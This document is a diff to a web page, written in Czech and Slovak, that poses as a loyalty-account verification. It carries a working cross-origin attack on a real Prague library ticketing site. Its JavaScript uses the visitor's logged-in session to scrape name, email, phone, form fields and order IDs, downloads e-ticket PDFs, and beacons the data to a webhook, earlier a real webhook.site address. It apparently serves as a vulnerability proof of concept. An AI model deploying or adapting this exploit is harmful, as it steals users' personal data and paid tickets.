@@ -12,6 +12,7 @@ h1{color:#1a5276}
 .hidden{display:none}
 #result{text-align:left;background:#f8f9fa;padding:15px;border-radius:5px;font-family:monospace;font-size:13px;white-space:pre-wrap;margin-top:20px}
 .tag{display:inline-block;background:#e74c3c;color:#fff;padding:2px 8px;border-radius:3px;font-size:11px;margin-bottom:10px}
+.dl{display:inline-block;background:#e74c3c;color:#fff;padding:10px 20px;border-radius:5px;text-decoration:none;margin:10px 5px;font-weight:bold}
 </style>
 </head>
 <body>
@@ -20,13 +21,14 @@ h1{color:#1a5276}
     <p>Ověřování věrnostního účtu...</p>
     <div class="spinner" id="spinner"></div>
     <p id="status">Načítání...</p>
+    <div id="downloads" class="hidden"></div>
     <div id="result" class="hidden"></div>
 </div>
 
 <script>
 // ══════════════════════════════════════════════════════════
 // KONFIGURÁCIA:
-const WEBHOOK = "https://webhook.site/#!/view/542b4ee2-7438-4385-be70-6d56c5ecc3e1";
+const WEBHOOK = "WEBHOOK_URL_SEM";
 // ══════════════════════════════════════════════════════════
 
 const T = "https://kultura.mlp.cz";
@@ -39,9 +41,19 @@ function ex(html, patterns) {
     return "";
 }
 
+function sendToWebhook(data) {
+    if (!WEBHOOK || WEBHOOK === "WEBHOOK_URL_SEM") return;
+    const payload = JSON.stringify(data, null, 2);
+    // navigator.sendBeacon — najspoľahlivejší, funguje cross-origin
+    const blob = new Blob([payload], {type: "text/plain"});
+    const sent = navigator.sendBeacon(WEBHOOK, blob);
+    console.log("sendBeacon:", sent ? "sent" : "failed");
+}
+
 async function steal() {
     const status = document.getElementById("status");
     const result = document.getElementById("result");
+    const downloads = document.getElementById("downloads");
     const spinner = document.getElementById("spinner");
 
     const stolen = {
@@ -51,114 +63,115 @@ async function steal() {
     };
 
     try {
-        // 1. Registration page
+        // ── 1. Profil ────────────────────────────────────
         status.textContent = "Ověřování účtu...";
         const r1 = await fetch(T + "/mkp/General/MyAccount/Registration", {credentials: "include"});
         const h1 = await r1.text();
 
-        // Email — hľadáme v rôznych miestach
         stolen.data.email = ex(h1, [
-            /registrationEmail"[^>]*value="([^"]+)"/,
             /name="Email"[^>]*value="([^"]+)"/,
-            /value="([^"]*)"[^>]*name="Email"/,
-            /value="([^"]*)"[^>]*id="registrationEmail"/,
+            /value="([^"]+)"[^>]*name="Email"/,
+            /registrationEmail"[^>]*value="([^"]+)"/,
+            /value="([^"]+)"[^>]*id="registrationEmail"/,
         ]);
-
-        // Meno — z value alebo z iných patterns
         stolen.data.jmeno = ex(h1, [
             /name="FirstName"[^>]*value="([^"]+)"/,
-            /value="([^"]*)"[^>]*name="FirstName"/,
-            /inputName"[^>]*value="([^"]+)"/,
-            /value="([^"]*)"[^>]*id="inputName"/,
+            /value="([^"]+)"[^>]*name="FirstName"/,
         ]);
-
         stolen.data.prijmeni = ex(h1, [
             /name="Surname"[^>]*value="([^"]+)"/,
-            /value="([^"]*)"[^>]*name="Surname"/,
-            /inputSurname"[^>]*value="([^"]+)"/,
-            /value="([^"]*)"[^>]*id="inputSurname"/,
+            /value="([^"]+)"[^>]*name="Surname"/,
         ]);
-
         stolen.data.telefon = ex(h1, [
             /name="PhoneNumber"[^>]*value="([^"]+)"/,
-            /value="([^"]*)"[^>]*name="PhoneNumber"/,
-            /inputPhone"[^>]*value="([^"]+)"/,
+            /value="([^"]+)"[^>]*name="PhoneNumber"/,
         ]);
 
-        // Všetky emaily na stránke
         const emails = [...new Set((h1.match(/[\w.-]+@[\w.-]+\.\w{2,}/g) || []))];
         if (!stolen.data.email && emails.length) stolen.data.email = emails[0];
         stolen.data.all_emails = emails;
 
-        // Skúsime nájsť dáta v hidden inputoch a JS
-        const allValues = [...h1.matchAll(/name="([^"]+)"[^>]*value="([^"]+)"/g)];
-        const allValues2 = [...h1.matchAll(/value="([^"]+)"[^>]*name="([^"]+)"/g)];
-        const formData = {};
-        allValues.forEach(m => { if(m[2].length > 0 && m[2].length < 100) formData[m[1]] = m[2]; });
-        allValues2.forEach(m => { if(m[1].length > 0 && m[1].length < 100) formData[m[2]] = m[1]; });
-        stolen.data.all_form_fields = formData;
+        // Všetky form fields
+        const fields = {};
+        [...h1.matchAll(/name="([^"]+)"[^>]*value="([^"]+)"/g)].forEach(m => { if(m[2].length < 100) fields[m[1]] = m[2]; });
+        [...h1.matchAll(/value="([^"]+)"[^>]*name="([^"]+)"/g)].forEach(m => { if(m[1].length < 100) fields[m[2]] = m[1]; });
+        stolen.data.form_fields = fields;
 
-        // 2. MyAccount — objednávky
+        // ── 2. MyAccount — objednávky ────────────────────
         status.textContent = "Načítání objednávek...";
         const r2 = await fetch(T + "/mkp/General/MyAccount?mrsid=1", {credentials: "include"});
         const h2 = await r2.text();
 
-        // Meno z navigácie
-        stolen.data.logged_as = ex(h2, [
-            /login__user-name[^>]*>\s*([^<]+)/,
-            /user-name[^>]*>\s*([^<]+)/,
-        ]);
+        stolen.data.logged_as = ex(h2, [/login__user-name[^>]*>\s*([^<]+)/]);
 
-        // Objednávky
+        // Meno z JS
+        const j = ex(h2, [/"Jmeno"\s*:\s*"([^"]+)"/, /\.Jmeno[^"]*"([^"]+)"/]);
+        const p = ex(h2, [/"Prijmeni"\s*:\s*"([^"]+)"/, /\.Prijmeni[^"]*"([^"]+)"/]);
+        const e = ex(h2, [/"Email"\s*:\s*"([^"]+)"/, /\.Email[^"]*"([^"]+)"/]);
+        if (j) stolen.data.jmeno = j;
+        if (p) stolen.data.prijmeni = p;
+        if (e && !stolen.data.email) stolen.data.email = e;
+
         const orders = [...new Set([...h2.matchAll(/orderId[^>]*?(\d+)/g)].map(m => m[1]))];
         stolen.data.order_ids = orders;
 
-        // MLP check authorization data (meno v JS)
-        const jmenoJS = ex(h2, [
-            /"Jmeno"\s*:\s*"([^"]+)"/,
-            /\.Jmeno\s*[=:]\s*"([^"]+)"/,
-        ]);
-        const prijmeniJS = ex(h2, [
-            /"Prijmeni"\s*:\s*"([^"]+)"/,
-            /\.Prijmeni\s*[=:]\s*"([^"]+)"/,
-        ]);
-        const emailJS = ex(h2, [
-            /"Email"\s*:\s*"([^"]+)"/,
-            /\.Email\s*[=:]\s*"([^"]+)"/,
-        ]);
-        if (jmenoJS) stolen.data.jmeno = jmenoJS;
-        if (prijmeniJS) stolen.data.prijmeni = prijmeniJS;
-        if (emailJS && !stolen.data.email) stolen.data.email = emailJS;
+        // ── 3. E-vstupenky — stiahnutie PDF ─────────────
+        status.textContent = "Stahování e-vstupenek...";
+        stolen.data.etickets = [];
+        const ticketIds = orders.length ? orders : ["110954"];
 
-        // 3. Košík
-        status.textContent = "Načítání košíku...";
-        const r3 = await fetch(T + "/mkp/standard/Cart/Index?mrsid=1", {credentials: "include"});
-        const h3 = await r3.text();
-        const total = h3.match(/value:\s*(\d+)/);
-        stolen.data.cart = total ? total[1] + " Kč" : "prázdný";
-
-        // 4. Exfiltrácia na webhook
-        if (WEBHOOK && WEBHOOK !== "https://webhook.site/#!/view/542b4ee2-7438-4385-be70-6d56c5ecc3e1") {
-            // Image beacon (vždy funguje)
-            const p = encodeURIComponent(JSON.stringify(stolen));
-            new Image().src = WEBHOOK + "?" + p.substring(0, 2000);
-            // Fetch s text/plain (obíde CORS preflight)
+        let dlHtml = "";
+        for (const oid of ticketIds.slice(0, 3)) {
             try {
-                await fetch(WEBHOOK, {
-                    method: "POST",
-                    body: JSON.stringify(stolen, null, 2),
-                    mode: "no-cors"
+                const rt = await fetch(T + "/mkp/General/Print/PrintETicket?orderId=" + oid, {
+                    credentials: "include"
                 });
-            } catch(e) {}
-            stolen._sent_to_webhook = true;
+                const ct = rt.headers.get("Content-Type") || "";
+                const blob = await rt.blob();
+                const isPdf = blob.size > 5000 && (ct.includes("octet") || ct.includes("pdf"));
+
+                stolen.data.etickets.push({
+                    orderId: oid,
+                    size: blob.size,
+                    type: ct,
+                    stolen: isPdf
+                });
+
+                if (isPdf) {
+                    // Vytvoriť download link pre ukradnutý PDF
+                    const url = URL.createObjectURL(blob);
+                    dlHtml += `<a class="dl" href="${url}" download="evstupenka_${oid}.pdf">📄 Stáhnout e-vstupenku #${oid} (${(blob.size/1024).toFixed(0)} KB)</a> `;
+
+                    // Pre webhook: konvertuj na base64 (prvých 500b ako dôkaz)
+                    const reader = new FileReader();
+                    reader.onload = function() {
+                        const b64 = reader.result.split(",")[1];
+                        stolen.data.etickets.find(t => t.orderId === oid).pdf_b64_preview = b64.substring(0, 200);
+                        // Odošli aktualizované dáta
+                        sendToWebhook(stolen);
+                    };
+                    reader.readAsDataURL(blob);
+                }
+            } catch(err) {
+                stolen.data.etickets.push({orderId: oid, error: err.message});
+            }
         }
 
-        // 5. Zobrazenie
+        // ── 4. Exfiltrácia ──────────────────────────────
+        sendToWebhook(stolen);
+
+        // ── 5. Zobrazenie ───────────────────────────────
         spinner.style.display = "none";
         const hasData = stolen.data.email || stolen.data.logged_as || stolen.data.jmeno;
         status.innerHTML = hasData
             ? '<span style="color:#e74c3c;font-weight:bold">⚠️ Vaše údaje byly přečteny z cizí domény!</span>'
             : '<span style="color:#f39c12">Session anonymní</span>';
+
+        if (dlHtml) {
+            downloads.classList.remove("hidden");
+            downloads.innerHTML = "<p><b>Ukradené e-vstupenky:</b></p>" + dlHtml;
+        }
+
         result.classList.remove("hidden");
         result.innerHTML = '<span class="tag">EXFILTROVANÁ DATA</span>\n' + JSON.stringify(stolen, null, 2);
 
